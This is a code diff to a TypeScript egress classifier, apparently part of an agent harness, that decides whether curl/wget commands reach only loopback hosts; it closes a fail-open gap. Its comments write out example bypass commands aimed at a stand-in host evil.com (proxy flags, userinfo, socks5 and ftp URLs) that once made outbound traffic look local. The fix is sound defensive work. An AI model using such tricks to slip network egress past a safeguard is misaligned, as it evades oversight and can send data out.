@@ -341,9 +341,66 @@ function isLoopbackEgress(command: string, segments: string[]): boolean {
     if (gitNetworkSubcommand(oper)) return false; // remote destination, never loopback-provable
     if (NETWORK_COMMANDS.has(first) && !LOOPBACK_EGRESS_CMDS.has(first)) return false;
   }
-  const urls = command.match(NETWORK_URL_RE_GLOBAL) ?? [];
-  if (urls.length === 0) return false; // destination behind a bare variable — unprovable
-  return urls.every((u) => isLoopbackHost(urlHost(u)));
+  const hosts = destinationHosts(command, segments);
+  if (!hosts || hosts.length === 0) return false; // unprovable destination — keep the stop
+  return hosts.every((h) => isLoopbackHost(h));
+}
+
+/**
+ * A curl/wget operand that states its destination with no scheme:
+ * `127.0.0.1:9931/models`, `[::1]:9931/models`, `localhost:8080/health`. The
+ * port or the path is what separates a target from a file operand: `curl -O
+ * pkg.tgz` names no host, and a bare `curl 127.0.0.1` (no port, no path)
+ * stays unprovable.
+ */
+const BARE_TARGET_RE = /^(\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9][A-Za-z0-9._-]*)(?::\d+)?[/?#]/;
+
+/**
+ * An operand that states a destination BARE_TARGET_RE cannot read. Dropping
+ * one is fail-OPEN, not fail-closed: the loopback hosts that survive still
+ * satisfy `every()`, so `curl -x evil.com:8080 http://127.0.0.1/y` looked
+ * local. Caught here: userinfo (`127.0.0.1@evil.com/x` — curl sends that to
+ * evil.com), a bare `host:digits` (`-x evil.com:8080`, a proxy — real egress
+ * even with a loopback URL in the command), and any other `scheme://` form
+ * (`socks5://evil.com:1080`, `ftp://evil.com/f` — the URL scan only knows
+ * http(s), so those hosts were invisible). `Accept:` (a header value) and
+ * `user:pass` (a credential) stay out: a port is digits, and a trailing
+ * colon proves nothing.
+ */
+const HOSTISH_RE = /^(?:[A-Za-z0-9._-]+@|[A-Za-z0-9._-]+:\d|\[[0-9A-Fa-f:.]+\])/;
+
+/** A `scheme://` operand the http(s) URL scan does not cover. */
+const OPAQUE_SCHEME_RE = /:\/\/|^\/{2}/;
+
+/**
+ * Every destination the egress classification can read off the text: URLs
+ * anywhere in the command, plus the scheme-less `host[:port]/path` operands
+ * of curl/wget. D14's locality proof is the HOST — the scheme carries nothing
+ * the host parse does not already have, so `curl 127.0.0.1:9931/models` is as
+ * judgeable as the qualified form (it used to surface no URL at all and fall
+ * through to the egress stop). `null` = the text states a destination this
+ * parse cannot resolve, which is not the same as stating no destination.
+ */
+function destinationHosts(command: string, segments: string[]): string[] | null {
+  const hosts = (command.match(NETWORK_URL_RE_GLOBAL) ?? []).map(urlHost);
+  for (const seg of segments) {
+    const oper = operativeWords(seg.trim().split(/\s+/));
+    const first = cleanToken(oper[0] ?? "").toLowerCase();
+    if (!first || !LOOPBACK_EGRESS_CMDS.has(first)) continue;
+    for (const w of oper.slice(1)) {
+      const t = cleanToken(w);
+      if (!t || t.startsWith("-")) continue; // flags stay out; their values are not hosts
+      const bare = t.match(BARE_TARGET_RE);
+      if (bare) {
+        hosts.push(bare[1]);
+        continue;
+      }
+      if (!/^https?:\/\//i.test(t) && (HOSTISH_RE.test(t) || OPAQUE_SCHEME_RE.test(t))) {
+        return null;
+      }
+    }
+  }
+  return hosts;
 }
 
 /**
